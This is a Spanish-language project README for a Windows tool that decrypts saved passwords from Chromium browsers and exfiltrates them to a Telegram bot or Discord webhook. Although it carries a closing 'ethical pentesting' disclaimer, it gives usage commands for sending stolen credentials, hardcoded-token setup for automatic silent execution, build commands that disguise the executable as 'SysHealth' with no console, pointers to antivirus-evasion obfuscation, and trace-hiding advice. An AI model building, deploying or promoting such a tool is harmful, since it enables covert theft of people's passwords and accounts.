# 🛡️ Chromium Credentials Auditor Suite

> [!NOTE]
> [English Version](README.en.md) | **Versión en Español**

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*Una suite avanzada para auditorías de seguridad profesional y pentesting ético en entornos Windows.*

[Reportar Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)

</div>

---

## 💻 Compatibilidad del Sistema

| Sistema Operativo | Versiones Soportadas | Arquitectura |
| :--- | :--- | :--- |
| 🪟 **Windows** | Windows 10 / Windows 11 | x64 / x86 |
| 🌐 **Chromium** | v80 o superior (AES-GCM) | Todas |

---

## ✨ Navegadores Soportados

La suite escanea y descifra automáticamente los siguientes objetivos:

* 🌐 **Google Chrome** (Canary, Beta, Stable)
* 🌐 **Microsoft Edge**
* 🦁 **Brave Browser**
* ⭕ **Opera & Opera GX**
* 📐 **Vivaldi**

---

## 🚀 Características Premium

* **📡 Exfiltración Modular**:
  * Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
* **📊 Reportes Dinámicos**:
  * Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
  * **Metadata Enriquecida**: Hostname, Usuario, PID y Versión incluidos en cada reporte.
  * **Sección de Filtrados**: Identificación y visualización separada de credenciales no-HTTP (protocolos locales, extensiones, etc.).
* **🕵️ Arquitectura de Sigilo (Stealth)**:
  * Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.
  * **Resiliencia de Red**: Sistema de reintentos automático para asegurar la exfiltración ante micro-cortes.

---

## 🛠️ Stack Tecnológico

| Componente | Tecnología Utilizada |
| :--- | :--- |
| **Lenguaje** | `Python 3.x` |
| **Seguridad de OS** | `Windows DPAPI` via `PyWin32` |
| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` |
| **Comunicación** | `Telegram API` & `Discord Webhooks` |
| **Packaging** | `PyInstaller` (Standalone EXE) |

---

## ⚙️ Guía de Uso Rápido

### 1. Instalación de Dependencias

```bash
pip install -r requirements.txt
```

### 2. Comandos Magistrales

> **Generar Reporte HTML Estético:**

```bash
python main.py -f html -o reporte_final
```

> **Exfiltración vía Telegram (Modo Rápido):**

```bash
python main.py -t "TOKEN" -c "ID" # Soporta Texto Plano o Base64
```

### 🔑 Uso Autónomo (Hardcoding)

Puedes pre-configurar el script editando la sección `CREDENCIALES HARDCODED` en `main.py` (Se recomienda usar **Base64** para mayor sigilo). Una vez rellenadas, puedes ejecutar el `.exe` o el script sin parámetros y los datos se enviarán automáticamente.

---

## 📦 Compilación Profesional y Ofuscación

Para generar un ejecutable robusto, sigiloso y (opcionalmente) ofuscado, utiliza el script **`build.py`** incluido. Este script automatiza la configuración de PyInstaller y PyArmor.

```bash
# Uso recomendado: un solo archivo, sin consola y con nombre personalizado
python build.py --name "SysHealth" --onefile --noconsole

# Para una compilación rápida sin ofuscación (solo PyInstaller)
python build.py --no-obf --name "ChromiumAuditor"
```

> [!TIP]
> Puedes ver todas las opciones de personalización (iconos, carpetas de salida, etc.) ejecutando `python build.py --help`.

### 🛡️ Endurecimiento y Ofuscación
Para proteger el binario contra ingeniería inversa y antivirus, consulta la [Guía de Ofuscación Híbrida](docs/OBFUSCATION_GUIDE.md).

### ⚙️ Guía de Compilación Avanzada
Para obtener instrucciones detalladas sobre flujos híbridos (Windows + WSL) o puros (Linux con Wine), consulta la [Guía de Flujos de Compilación](docs/COMPILATION_FLOWS.md).

## 🚦 Panel de Argumentos CLI

| Corto | Largo | Descripción |
| :--- | :--- | :--- |
| `-f` | `--format` | Formato: `html` o `csv`. |
| `-o` | `--output` | Nombre base del archivo de salida. |
| **`-t`** | `--telegram-token` | Token del bot de Telegram (Plano o B64). |
| **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
| **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
| `-s` | `--stealth` | Oculta la consola en tiempo real (idéntico a `.exe --noconsole`). |
| — | `--no-wipe` | Evita auto-borrado del reporte local tras envío. |
| — | `--clean` | Elimina todos los reportes acumulados (`.html`, `.csv`) en la carpeta de salida. |
| `-v` | `--verbose` | Modo verboso (logs detallados de depuración). |

---

## 📡 Configuración de Exfiltración

### 🤖 Telegram

Necesitas dos valores: el **Token del Bot** y el **ID del Destino**.

**Token del Bot** — Obténlo hablando con `@BotFather` en Telegram:

```text
1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ
```

**ID del Destino** — El campo `-c` / `HARDCODED_TG_ID` acepta tres tipos:

| Tipo de Destino | Formato del ID | Cómo Obtenerlo |
| :--- | :--- | :--- |
| 💬 **Chat Personal** | Número positivo `987654321` | Habla con `@userinfobot` |
| 👥 **Grupo Privado** | Número negativo `-1001234567890` | Añade `@RawDataBot` al grupo |
| 📢 **Canal Privado** | Número negativo `-1001234567890` | Añade el bot al canal como admin |

> [!IMPORTANT]
> Para **grupos y canales**, añade tu bot como miembro con permisos de **"Enviar Archivos"** antes de usarlo.
> Para **chats personales**, envía primero un mensaje a tu bot para iniciar la conversación.

### 🎮 Discord

Obten la URL del Webhook en: **Canal → Editar Canal → Integraciones → Webhooks → Crear Webhook**

```text
https://discord.com/api/webhooks/1234567890/TOKEN_SECRETO_AQUI
```

Pega esa URL completa en `-d` / `HARDCODED_DS_WEBHOOK`.

### 🔒 Recomendación de Seguridad Operacional

Para máxima discrección y trazabilidad cero:

1. Crea un **canal privado exclusivo** para cada auditoría.
2. Añade el bot como único administrador del canal.
3. Usa el ID del canal como `HARDCODED_TG_ID`.
4. **Elimina el canal y el bot** al finalizar la auditoría.

Así, si el token fuera comprometido, el atacante solo accedería a un canal vacío y eliminado.

---

## ⚖️ Aviso Legal y Ético

> [!CAUTION]
> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
> El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.

---
